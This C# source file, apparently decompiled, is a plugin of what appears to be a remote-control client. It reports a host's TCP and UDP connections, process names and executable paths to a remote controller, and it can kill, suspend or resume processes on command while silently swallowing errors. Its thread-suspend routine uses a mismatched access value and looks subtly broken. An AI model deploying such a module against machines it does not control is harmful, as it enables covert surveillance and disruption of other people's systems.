using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Runtime.InteropServices;
using Leb128;
using Plugin.Helper;

namespace Plugin;

public class HandleNetstat
{
	private const int PROCESS_TERMINATE = 1;

	private const int PROCESS_SUSPEND_RESUME = 2048;

	[DllImport("kernel32.dll")]
	private static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);

	[DllImport("kernel32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool CloseHandle(IntPtr hObject);

	[DllImport("kernel32.dll")]
	private static extern bool TerminateProcess(IntPtr hProcess, uint uExitCode);

	[DllImport("kernel32.dll")]
	private static extern int SuspendThread(IntPtr hThread);

	[DllImport("kernel32.dll")]
	private static extern int ResumeThread(IntPtr hThread);

	public static bool KillProcess(int processId)
	{
		IntPtr intPtr = OpenProcess(1, bInheritHandle: false, processId);
		if (intPtr == IntPtr.Zero)
		{
			return false;
		}
		bool result = TerminateProcess(intPtr, 0u);
		CloseHandle(intPtr);
		return result;
	}

	public static bool SuspendProcess(int processId)
	{
		IntPtr intPtr = OpenProcess(2048, bInheritHandle: false, processId);
		if (intPtr == IntPtr.Zero)
		{
			return false;
		}
		foreach (ProcessThread thread in Process.GetProcessById(processId).Threads)
		{
			IntPtr intPtr2 = OpenThread(2048, bInheritHandle: false, (uint)thread.Id);
			SuspendThread(intPtr2);
			CloseHandle(intPtr2);
		}
		CloseHandle(intPtr);
		return true;
	}

	public static bool ResumeProcess(int processId)
	{
		IntPtr intPtr = OpenProcess(2048, bInheritHandle: false, processId);
		if (intPtr == IntPtr.Zero)
		{
			return false;
		}
		foreach (ProcessThread thread in Process.GetProcessById(processId).Threads)
		{
			IntPtr intPtr2 = OpenThread(2048, bInheritHandle: false, (uint)thread.Id);
			ResumeThread(intPtr2);
			CloseHandle(intPtr2);
		}
		CloseHandle(intPtr);
		return true;
	}

	[DllImport("kernel32.dll")]
	private static extern IntPtr OpenThread(int dwDesiredAccess, bool bInheritHandle, uint dwThreadId);

	public static void NetstatList()
	{
		try
		{
			List<object> list = new List<object>();
			list.Add("Netstat");
			list.Add("ListTcp");
			Table.MIB_TCPROW_OWNER_PID[] allTcpConnections = Table.GetAllTcpConnections();
			for (int i = 0; i < allTcpConnections.Length; i++)
			{
				Table.MIB_TCPROW_OWNER_PID mIB_TCPROW_OWNER_PID = allTcpConnections[i];
				string text = $"{Table.GetIpAddress(mIB_TCPROW_OWNER_PID.localAddr)}:{mIB_TCPROW_OWNER_PID.LocalPort}";
				string text2 = $"{Table.GetIpAddress(mIB_TCPROW_OWNER_PID.remoteAddr)}:{mIB_TCPROW_OWNER_PID.RemotePort}";
				object[] obj = new object[6]
				{
					Process.GetProcessById(mIB_TCPROW_OWNER_PID.owningPid).ProcessName,
					mIB_TCPROW_OWNER_PID.owningPid,
					text,
					text2,
					null,
					null
				};
				Table.TCP_CONNECTION_STATE state = (Table.TCP_CONNECTION_STATE)mIB_TCPROW_OWNER_PID.state;
				obj[4] = state.ToString();
				obj[5] = Table.GetProcessPath(mIB_TCPROW_OWNER_PID.owningPid);
				list.AddRange(obj);
			}
			Client.Send(LEB128.Write(list.ToArray()));
		}
		catch
		{
		}
		try
		{
			List<object> list2 = new List<object>();
			list2.Add("Netstat");
			list2.Add("ListUdp");
			Table.MIB_UDPROW_OWNER_PID[] allUdpConnections = Table.GetAllUdpConnections();
			for (int i = 0; i < allUdpConnections.Length; i++)
			{
				Table.MIB_UDPROW_OWNER_PID mIB_UDPROW_OWNER_PID = allUdpConnections[i];
				string text3 = $"{Table.GetIpAddress(mIB_UDPROW_OWNER_PID.dwLocalAddr)}:{mIB_UDPROW_OWNER_PID.dwLocalPort}";
				list2.AddRange(new object[4]
				{
					Process.GetProcessById(mIB_UDPROW_OWNER_PID.dwOwningPid).ProcessName,
					mIB_UDPROW_OWNER_PID.dwOwningPid,
					text3,
					Table.GetProcessPath(mIB_UDPROW_OWNER_PID.dwOwningPid)
				});
			}
			Client.Send(LEB128.Write(list2.ToArray()));
		}
		catch
		{
		}
	}
}
